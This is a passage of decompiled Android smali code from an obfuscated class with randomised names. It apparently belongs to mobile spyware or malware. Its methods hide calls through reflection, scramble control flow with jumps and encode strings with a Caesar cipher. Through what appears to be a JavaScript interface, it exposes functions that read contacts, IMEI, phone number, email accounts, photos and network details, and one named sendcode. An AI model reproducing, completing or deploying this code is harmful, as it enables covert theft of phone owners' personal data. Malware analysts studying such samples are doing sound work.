
    const/4 v2, 0x0

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const-string v2, "show"

    const-class v5, Landroid/widget/Toast;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v2, 0x3

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Landroid/content/Context;

    aput-object v5, v3, v2

    aput-object v0, v4, v2

    const/4 v2, 0x1

    const-class v5, Ljava/lang/CharSequence;

    aput-object v5, v3, v2

    aput-object p1, v4, v2

    const/4 v2, 0x2

    sget-object v5, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v5, v3, v2

    new-instance v5, Ljava/lang/Integer;

    invoke-direct {v5, v1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v5, v4, v2

    const-string v2, "makeText"

    const-class v5, Landroid/widget/Toast;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/widget/Toast;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v1, 0x0

    nop

    goto :goto_2

    :goto_4
    nop

    iget-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_3

    :goto_5
    nop

    nop
.end method

.method private xwrite(Ljava/lang/String;I)V
    .locals 9
    .param p1, "name"    # Ljava/lang/String;
    .param p2, "value"    # I
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto/16 :goto_7

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_8

    :goto_1
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "commit"

    const-class v8, Landroid/content/SharedPreferences$Editor;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object p1, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, p2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "putInt"

    const-class v8, Landroid/content/SharedPreferences$Editor;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "edit"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v4, 0x0

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_5

    :goto_7
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_6

    :goto_8
    nop

    nop
.end method


# virtual methods
.method public countphones()I
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xcountphones()I

    move-result v0

    return v0
.end method

.method public country()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xcountry()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getDeviceName()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xgetDeviceName()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getcontacts()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xgetcontacts()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getstatus()I
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xgetstatus()I

    move-result v0

    return v0
.end method

.method public imei()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->ximei()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public log(Ljava/lang/String;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xlog(Ljava/lang/String;)V

    return-void
.end method

.method public mail()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xmail()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public model()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xmodel()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public network()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xnetwork()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public phone()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xphone()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public photo()I
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xphoto()I

    move-result v0

    return v0
.end method

.method public photoimg()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xphotoimg()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public read(Ljava/lang/String;I)I
    .locals 5

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xread(Ljava/lang/String;I)I

    move-result v0

    return v0
.end method

.method public sendcode(Ljava/lang/String;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xsendcode(Ljava/lang/String;)V

    return-void
.end method

.method public setstatus(I)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xsetstatus(I)V

    return-void
.end method

.method public showToast(Ljava/lang/String;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xshowToast(Ljava/lang/String;)V

    return-void
.end method

.method public write(Ljava/lang/String;I)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->xwrite(Ljava/lang/String;I)V

    return-void
.end method
